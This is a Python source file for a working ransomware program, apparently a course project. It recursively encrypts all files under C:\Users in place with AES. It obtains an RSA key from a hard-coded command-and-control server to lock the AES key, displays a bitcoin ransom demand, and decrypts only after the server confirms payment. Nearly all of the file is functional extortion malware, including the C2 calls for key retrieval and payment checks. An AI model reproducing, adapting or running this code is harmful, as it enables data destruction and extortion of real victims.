# For AES Encryption
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# For RSA Encryption
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

# For MessageBoxes
import tkinter as tk
from tkinter import messagebox

# Misc
import requests
import os


# Ransomware Encryption Utilities
def encrypt_file(file_path, out_file_path, key):
    # Read in Try/Catch So as to not crash due to PermissionError
    try:
        with open(file_path, 'rb') as infile:
            in_data = infile.read()
    except Exception as e:
        return False

    # Initialize AES Encryption
    initial_vector = get_random_bytes(AES.block_size)
    encryptor = AES.new(key, AES.MODE_CBC, initial_vector)

    # Prep for encryption, Try/Catch to not crash due to padding errors
    try:
        padded_data = pad(in_data, AES.block_size)
    except Exception as e:
        return False

    out_data = encryptor.encrypt(padded_data)

    try:
        with open(out_file_path, 'wb') as outfile:
            outfile.write(initial_vector+out_data)
            return True

    except Exception as e:
        return False
    return False

def decrypt_file(file_path, out_file_path, key):
    # Read in Try/Catch so as to not crash
    try:
        with open(file_path, 'rb') as infile:
            initial_vector = infile.read(AES.block_size)
            to_decrypt = infile.read()
    except Exception as e:
        return False

    # Sometimes may read in unpadded data, so trying to unpad will crash
    try:
        encryptor = AES.new(key, AES.MODE_CBC, initial_vector)
        decrypted = unpad(encryptor.decrypt(to_decrypt), AES.block_size)
    except Exception as e:
        return False
    
    try:
        with open(out_file_path, 'wb') as outfile:
            outfile.write(decrypted)
            return True
    except Exception as e:
        return False
    return False

# Batch Functions
file_paths = []

# Get list of paths to files to encrypt starting from Users folder
def load_file_paths():
    for root, dirs, files in os.walk("C:\\Users"):
        for name in files:
            path = os.path.join(root, name)
            global file_paths
            if "cecs378" not in path.lower() and "python" not in path.lower():
                file_paths.append(os.path.join(root, name))

# C2 Server Connection
url = 'http://34.66.45.94:3000/'
pub_path = "./pub_key.pem"
priv_key = None

def has_paid(pub_key) -> bool:
    # Query C2 to Confirm Payment
    pay_request = requests.post(url+'check-payment', 
                                json={'pub_key':pub_key})
    if pay_request.status_code != 200:
        print("Failed to request payment check...")
        return False

    result = pay_request.json().get('success')

    if result == 'true':
        # Retrieve private key to use to decrypt AES key
        priv_key_pem = pay_request.json().get('key')
        global priv_key
        priv_key = serialization.load_pem_private_key(
                priv_key_pem.encode('utf-8'),
                password=None
                )
        return True
    else:
        return False

# Get AES Key
key_path = "./aes_key.bin"
key = None

# If Encryption Keys Exist, this is the second time running the exe
if os.path.exists(key_path) and os.path.exists(pub_path):
    with open(key_path, 'rb') as key_file:
        key = key_file.read()

else:
    # First Time Running the Exe
    key = get_random_bytes(32)

    # Start Encrypting Computer
    load_file_paths()
    encrypted_files = ""
    for path in file_paths:
        print(path)
        r = encrypt_file(path, path, key)
        if r:
            encrypted_files += path + '\n'

    # Write out which files were encrypted to know which need to be
    # decrypted later
    with open("./encrypted_files.txt", 'w') as encfiles:
            encfiles.write(encrypted_files)

    # Encrypt AES Key And Store In File
    # Get Public Key From C2 Server
    pub_key = None
    key_request = requests.get(url+'gen-key')
    if key_request.status_code != 200:
        print("Failed to grab public key")
        exit()

    pub_key_pem = key_request.json().get('pub_key')
    pub_key = serialization.load_pem_public_key(
            pub_key_pem.encode('utf-8'),
            backend=default_backend()
        )

    # Use Public Key to Encrypt AES Key
    aes_key = pub_key.encrypt(key,
                              padding.OAEP(
                                  mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                  algorithm=hashes.SHA256(),
                                  label = None
                                  )
                              )
    
    # Store AES Key Into File
    with open(key_path, 'wb') as key_file:
        key_file.write(aes_key)

    # Store Public Key Pem Into File
    with open(pub_path, 'w') as pub_file:
        pub_file.write(pub_key_pem)

    messagebox.showinfo("Computer Hostage!", "Please pay 1 bitcoin to address: <insert wallet>")

# Read Public Key from File, used to Identify current victim
pub_key_pem = None
with open(pub_path, 'r') as pub_file:
    pub_key_pem = pub_file.read()

# This confirmation is here to let the server know they can check the db
usr = messagebox.askyesno("Payment", "Did you pay?")

if not usr:
    messagebox.showinfo("Well..", "Come back when you do!")

    # I simulate a payment because I'm not wasting money..
    requests.post(url+"simulate-payment", json={'pub_key':pub_key_pem})
    exit()

if has_paid(pub_key_pem) == False:
    messagebox.showinfo("Wow..", "You're a little liar")
    exit()

# Read in Encrypted AES Key
with open(key_path, 'rb') as key_file:
        key = key_file.read()

# Use the private key retrieved from /check-payment (has_paid() function)
decrypted_aes = priv_key.decrypt(
        key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
            )
        )

# Use the encrypted_files file to know the paths of files to decrypt
with open('./encrypted_files.txt', 'r') as files:
    for line in files:
        d_line = line.strip()
        print(d_line)
        decrypt_file(d_line, d_line, decrypted_aes)

